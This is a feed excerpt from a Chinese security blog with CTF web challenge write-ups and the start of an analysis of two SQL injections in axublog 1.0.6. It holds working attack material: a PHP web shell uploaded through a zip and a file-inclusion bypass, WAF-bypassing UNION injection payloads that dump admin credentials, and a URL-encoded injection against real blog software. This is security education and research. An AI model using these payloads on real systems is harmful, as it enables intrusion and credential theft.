class="keyword">die</span>(<span class="string">'name is too long !'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($name, <span class="string">'./'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'invalid parameter'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($name, <span class="string">'php'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'invalid parameter'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'zip'</span> &amp;&amp; substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'jpg'</span> &amp;&amp; substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'png'</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'file can not upload ! '</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($error &gt; <span class="number">0</span>)</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Error uploading file! code $error."</span>);</div><div class="line">    <span class="keyword">else</span></div><div class="line">       &#123;</div><div class="line">        <span class="keyword">if</span>($type !== <span class="string">"application/zip"</span> || $size &gt; <span class="number">400</span>)<span class="comment">//condition for the file</span></div><div class="line">        &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Format not allowed or file size too big!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">          <span class="keyword">if</span>(file_exists(<span class="string">'includes'</span>))&#123;</div><div class="line">            move_uploaded_file($temp, <span class="string">"includes/uploaded/"</span> .$name);</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Upload complete a!"</span>;</div><div class="line">            shell_exec(<span class="string">'sh /var/www/html/includes/unzip.sh'</span>);</div><div class="line">          &#125;<span class="keyword">elseif</span>(file_exists(<span class="string">'uploaded'</span>))&#123;</div><div class="line">            move_uploaded_file($temp, <span class="string">"uploaded/"</span> .$name);</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Upload complete!"</span>;</div><div class="line">            shell_exec(<span class="string">'sh /var/www/html/includes/unzip.sh'</span>);</div><div class="line">          &#125;</div><div class="line">         &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'step'</span>]) &amp;&amp; strlen($_GET[<span class="string">'step'</span>]) === <span class="number">20</span>) &#123;</div><div class="line">      <span class="keyword">if</span> (stripos($_GET[<span class="string">'step'</span>], <span class="string">'lag'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="keyword">if</span> (stripos($_GET[<span class="string">'step'</span>], <span class="string">'./'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="keyword">if</span> (stripos($_GET[<span class="string">'step'</span>], <span class="string">' '</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="keyword">if</span> (stripos($_GET[<span class="string">'step'</span>], <span class="string">'/'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">if</span> (preg_match(<span class="string">'/[^\w\d_ -]/si'</span>, $_GET[<span class="string">'step'</span>])) &#123;</div><div class="line">        $_GET[<span class="string">'step'</span>] = preg_replace(<span class="string">'/[^a-zA-Z0-9_ -]/s'</span>, <span class="string">''</span>, $_GET[<span class="string">'step'</span>]);</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</div><div class="line">      &#125;</div><div class="line">        passthru(<span class="string">'cat '</span> . <span class="string">'uploaded/'</span> . $_GET[<span class="string">'step'</span>]);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">      <span class="keyword">die</span>();</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>接下来审计upload.php，可以看到允许上传zip文件，里面有这么一段代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(file_exists(<span class="string">'includes'</span>))&#123;</div><div class="line">  move_uploaded_file($temp, <span class="string">"includes/uploaded/"</span> .$name);</div><div class="line">  <span class="keyword">echo</span> <span class="string">"Upload complete a!"</span>;</div><div class="line">  shell_exec(<span class="string">'sh /var/www/html/includes/unzip.sh'</span>);</div><div class="line">&#125;<span class="keyword">elseif</span>(file_exists(<span class="string">'uploaded'</span>))&#123;</div><div class="line">  move_uploaded_file($temp, <span class="string">"uploaded/"</span> .$name);</div><div class="line">  <span class="keyword">echo</span> <span class="string">"Upload complete!"</span>;</div><div class="line">  shell_exec(<span class="string">'sh /var/www/html/includes/unzip.sh'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>调用了unzip.sh，访问<a href="http://47.104.188.226:20001/includes/unzip.sh" target="_blank" rel="external">http://47.104.188.226:20001/includes/unzip.sh</a> ,得到代码：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#/bin/bash</span></div><div class="line"><span class="built_in">cd</span> ./uploaded</div><div class="line">find ./ -size +1M | xargs rm</div><div class="line"><span class="built_in">cd</span> ../</div><div class="line">unzip -o ./uploaded/*.zip <span class="_">-d</span> ./uploaded/</div><div class="line">rm -rf ./uploaded/*.zip</div><div class="line">rm -rf ./uploaded/*.*</div><div class="line">rm -rf ./uploaded/.*</div><div class="line"><span class="built_in">cd</span> ./uploaded</div><div class="line">find -type d | xargs rm -rf</div><div class="line">touch /var/www/html/includes/uploaded/index.php</div><div class="line">chmod 000 /var/www/html/includes/uploaded/index.php</div></pre></td></tr></table></figure></p>
<p>sh脚本会将zip包解压缩到当前目录的uploaded目录下，接着删除符合规则的三种文件和目录。最后创建index.php，并设置权限位。</p>
<p>综上，我们构造一个压缩包，使之解压后不被删除，同时结合index.php的page参数的文件包含功能，即可获得shell。</p>
<p>文件chybeta内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">system(&apos;cat flag/flag/flag/flag/flag/flag/flag.php&apos;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>压缩后为c.zip，在上传时抓包，将type改为application/zip。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/6.jpg?raw=true" alt=""></p>
<p>上传成功后，会执行unzip.sh，即可解压出压缩包的内容，比如访问<a href="http://47.104.188.226:20001/includes/uploaded/chybeta" target="_blank" rel="external">http://47.104.188.226:20001/includes/uploaded/chybeta</a></p>
<p>接着考虑如何包含uploaded目录下的chybeta文件。在index.php中，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">if (stripos($_SERVER[&apos;QUERY_STRING&apos;], &apos;uploaded&apos;) &gt; 0) &#123;</div><div class="line">  die(&apos;no uploaded uploaded uploaded uploaded !&apos;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>由于这里是用<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>，并且用stripos来定位，所以当我们访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.104.188.226:20001/index.php?uploaded&amp;page=uploaded/chybeta</div></pre></td></tr></table></figure></p>
<p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>即为<code>uploaded&amp;page=uploaded/chybeta</code>，strpos的值为0，从而绕过了检测。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/7.jpg?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;CVE_SomeThing_aBout_gitLab&#125;</div></pre></td></tr></table></figure></p>
<h1 id="YUNWAF的突破-青云"><a href="#YUNWAF的突破-青云" class="headerlink" title="YUNWAF的突破_青云"></a>YUN<em>WAF</em>的突破_青云</h1><h2 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">工控云管理系统新版本，有防护了。不知道防护有没有用。</div><div class="line">http://qcloudcetc.xctf.org.cn:8099</div><div class="line">`</div><div class="line">## Solution</div><div class="line">当用户名过长时，即可绕过waf，这里a的个数为886个：</div></pre></td></tr></table></figure>
<p>username=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa’+UNION+ALL+SELECT+32,32,CONCAT((SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)),32#</p>
<p>result:<br>information_schema cetCCHqy004 mysql performance_schema<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/8.jpg?raw=true)</div><div class="line"></div><div class="line">最后payload：</div></pre></td></tr></table></figure></p>
<p>username=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa’+UNION+ALL+SELECT+32,32,CONCAT((SELECT+GROUP_CONCAT(username,password,question,answer+SEPARATOR+0x3c62723e)+FROM+cetCCHqy004.admin)),32#<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/10.jpg?raw=true)</div><div class="line"></div><div class="line"># 请关注工控云管理系统的警告记录</div><div class="line">## 题目</div></pre></td></tr></table></figure></p>
<p>参与工控云管理系统警告记录的活动，可能奖励你一个flag<br><a href="http://47.104.166.183:20008" target="_blank" rel="external">http://47.104.166.183:20008</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">## Solution</div><div class="line">题目给了源码，在 http://47.104.166.183:20008/getflag.php</div><div class="line">```php</div><div class="line">&lt;?php</div><div class="line">   if(!isset($_GET[&apos;c&apos;]) &amp;&amp; !isset($_GET[&apos;re&apos;])) &#123;</div><div class="line">	   show_source(__FILE__);</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   $selfdir = $_GET[&apos;dir&apos;];</div><div class="line">   if (!isset($selfdir)) &#123;</div><div class="line">	 die();</div><div class="line">   &#125;</div><div class="line">   $secret = &apos;/var/www/html/hackme/&apos; . md5(&quot;cetcrce&quot; . $selfdir . $_SERVER[&apos;REMOTE_ADDR&apos;]);</div><div class="line">   @chdir(&apos;hackme&apos;);</div><div class="line">   @mkdir($secret);</div><div class="line">   @chdir($secret);</div><div class="line"></div><div class="line">   if (isset($_GET[&apos;c&apos;]) &amp;&amp; strlen($_GET[&apos;c&apos;]) &lt;= 5) &#123;</div><div class="line">	   include(&apos;waf.php&apos;);</div><div class="line">	   @exec($_GET[&apos;c&apos;]);</div><div class="line">   &#125;elseif(isset($_GET[&apos;re&apos;])) &#123;</div><div class="line">	   @exec(&apos;/bin/rm -rf &apos; . $secret);</div><div class="line">	   @exec(&apos;touch /var/www/html/hackme/index.php&apos;);</div><div class="line">   &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>相比于hitcon17的babyfirst，多了个waf.php，但不知道它的具体内容。<br>参考 <a href="https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/">HITCON CTF 2017-BabyFirst Revenge-writeup </a></p>
<p>用wget获取文件index.html，执行<code>sh i*</code>即可执行<code>sh index.html</code>：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/11.jpg?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;J0w_ab0ut_c0mmAnd_3xcu&#125;</div></pre></td></tr></table></figure></p>
<h1 id="工控云管理系统项目管理页面解析漏洞"><a href="#工控云管理系统项目管理页面解析漏洞" class="headerlink" title="工控云管理系统项目管理页面解析漏洞"></a>工控云管理系统项目管理页面解析漏洞</h1><h2 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">这个工控云管理系统的解析漏洞要靠管理员去修补。</div><div class="line">http://47.104.156.32:20007</div></pre></td></tr></table></figure>
<h2 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h2><p>点进去后，点击项目管理，发现url为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.104.156.32:20007/index.php?page=flag.php</div></pre></td></tr></table></figure></p>
<p>同时有一个view-source按钮，给了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"> <span class="keyword">if</span> ($_SESSION[<span class="string">'admin'</span>]) &#123;</div><div class="line">   $con = $_POST[<span class="string">'con'</span>];</div><div class="line">   $file = $_POST[<span class="string">'file'</span>];</div><div class="line">   $filename = <span class="string">"backup/"</span>.$file;</div><div class="line"></div><div class="line">   <span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</div><div class="line">   &#125;<span class="keyword">else</span>&#123;</div><div class="line">        chdir(<span class="string">'uploaded'</span>);</div><div class="line">       $f = fopen($filename, <span class="string">'w'</span>);</div><div class="line">       fwrite($f, $con);</div><div class="line">       fclose($f);</div><div class="line">   &#125;</div><div class="line"> &#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[id]) &amp;&amp; floatval($_GET[id]) !== <span class="string">'1'</span> &amp;&amp; substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>) &#123;</div><div class="line">    <span class="keyword">include</span> <span class="string">'config.php'</span>;</div><div class="line">    $id = mysql_real_escape_string($_GET[id]);</div><div class="line">    $sql=<span class="string">"select * from cetc007.user where id='$id'"</span>;</div><div class="line">    $result = mysql_query($sql);</div><div class="line">    $result = mysql_fetch_object($result);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    $result = <span class="keyword">False</span>;</div><div class="line">    <span class="keyword">die</span>();</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(!$result)<span class="keyword">die</span>(<span class="string">"&lt;br &gt;something wae wrong ! &lt;br&gt;"</span>);</div><div class="line">  <span class="keyword">if</span>($result)&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"id: "</span>.$result-&gt;id.<span class="string">"&lt;/br&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"name:"</span>.$result-&gt;user.<span class="string">"&lt;/br&gt;"</span>;</div><div class="line">    $_SESSION[<span class="string">'admin'</span>] = <span class="keyword">True</span>;</div><div class="line">  &#125;</div><div class="line"> <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>接下来这段代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"> <span class="keyword">if</span> ($_SESSION[<span class="string">'admin'</span>]) &#123;</div><div class="line">   $con = $_POST[<span class="string">'con'</span>];</div><div class="line">   $file = $_POST[<span class="string">'file'</span>];</div><div class="line">   $filename = <span class="string">"backup/"</span>.$file;</div><div class="line"></div><div class="line">   <span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</div><div class="line">   &#125;<span class="keyword">else</span>&#123;</div><div class="line">        chdir(<span class="string">'uploaded'</span>);</div><div class="line">       $f = fopen($filename, <span class="string">'w'</span>);</div><div class="line">       fwrite($f, $con);</div><div class="line">       fclose($f);</div><div class="line">   &#125;</div><div class="line"> &#125;</div><div class="line"> <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>参考 <a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="external">http://wonderkun.cc/index.html/?p=626</a></p>
<h1 id="云工控管理系统文档中心的秘密"><a href="#云工控管理系统文档中心的秘密" class="headerlink" title="云工控管理系统文档中心的秘密"></a>云工控管理系统文档中心的秘密</h1><h2 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">云工控管理系统的文档中心页面，存在不易被发现的漏洞。</div><div class="line">http://47.104.73.107:20002/</div></pre></td></tr></table></figure>
<h2 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution"></a>Solution</h2><h1 id="YUNWAF的突破-华为云"><a href="#YUNWAF的突破-华为云" class="headerlink" title="YUNWAF的突破_华为云"></a>YUN<em>WAF</em>的突破_华为云</h1><h2 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">工控云管理系统新版本，有防护了。不知道防护有没有用。</div><div class="line">http://huaweicetc.xctf.org.cn</div></pre></td></tr></table></figure>
<h2 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution"></a>Solution</h2><h1 id="YUNWAF的突破-阿里"><a href="#YUNWAF的突破-阿里" class="headerlink" title="YUNWAF的突破_阿里"></a>YUN<em>WAF</em>的突破_阿里</h1><h2 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">工控云管理系统新版本，有防护了。不知道防护有没有用。</div><div class="line">http://alicetc.xctf.org.cn</div></pre></td></tr></table></figure>
<h2 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution"></a>Solution</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;为什么比赛要办在考试周。。&lt;br&gt;一些题是比赛完后做的，暂时只写了部分题的wp。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>axublog v1.0.6 两处sql注入分析</title>
    <link href="http://chybeta.github.io/2017/12/26/axublog-v1-0-6-%E4%B8%A4%E5%A4%84sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
    <id>http://chybeta.github.io/2017/12/26/axublog-v1-0-6-两处sql注入分析/</id>
    <published>2017-12-26T08:23:22.000Z</published>
    <updated>2017-12-26T09:30:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>继续水一水，把以前随手看的发上来。</p>
<a id="more"></a>
<h1 id="axublog"><a href="#axublog" class="headerlink" title="axublog"></a>axublog</h1><p>下载地址：<a href="http://www.axublog.com/post/axublog_jian_zhan_xi_tong_update_download/#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80" target="_blank" rel="external">http://www.axublog.com/post/axublog_jian_zhan_xi_tong_update_download/#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80</a></p>
<h1 id="sql注入一：hit-php"><a href="#sql注入一：hit-php" class="headerlink" title="sql注入一：hit.php"></a>sql注入一：hit.php</h1><p>hit.php的代码量较小，这里直接贴出来：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">"Content-type:text/html; charset=utf-8"</span>);</div><div class="line"><span class="keyword">require</span>(<span class="string">"cmsconfig.php"</span>);</div><div class="line"><span class="keyword">require</span>(<span class="string">"class/c_other.php"</span>);</div><div class="line">sqlguolv();</div><div class="line"></div><div class="line">$g=$_GET[<span class="string">'g'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($g==<span class="string">'arthit'</span>)&#123;</div><div class="line">	$id=$_GET[<span class="string">'id'</span>];</div><div class="line">	<span class="keyword">if</span>($id!=<span class="string">''</span>)&#123;   </div><div class="line">		$tab=$tabhead.<span class="string">"arts"</span>;</div><div class="line">		mysql_select_db($tab);</div><div class="line">		$sql=mysql_query(<span class="string">"UPDATE "</span>.$tab.<span class="string">" SET hit=hit+1 where id="</span>.$id);</div><div class="line">		$sql = mysql_query(<span class="string">"select * from "</span>.$tab.<span class="string">" where id="</span>.$id);</div><div class="line">		$row=mysql_fetch_array($sql);</div><div class="line">	    $str=$row[<span class="string">'hit'</span>];</div><div class="line">	    <span class="keyword">echo</span> <span class="string">'document.write('</span>.$str.<span class="string">');'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>其中sqlguolv()函数定义在 <code>class\c_other.php</code>的第545行左右：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Function sqlguolv() &#123;</div><div class="line">		@header(&quot;Content-type:text/html; charset=utf-8&quot;);</div><div class="line">if (preg_match(&apos;/select|insert|update|delete|\&apos;|\\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/i&apos;,$_SERVER[&apos;QUERY_STRING&apos;])==1 or preg_match(&apos;/select|insert|update|delete|\&apos;|\\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/i&apos;,file_get_contents(&quot;php://input&quot;))==1)&#123;echo &quot;警告 非法访问！&quot;;    exit;&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>不过由于程序没有考虑到编码的问题，因此可以对某些关键字进行url编码进行绕过。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171226/1.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171226/2.jpg?raw=true" alt=""></p>
<p>结合表的结构，可以构造出以下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:2500/axublog/axublog1.0.6install/hit.php?g=arthit&amp;id=0+uni%6fn+s%65l%65ct+1,1,1,1,1,1,group_concat(id,0x3c62723e,adnaa,0x3c62723e,adpss,0x3c62723e),1,1,1,1,1+fro%6d+axublog_adusers</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171226/3.jpg?raw=true" alt=""></p>
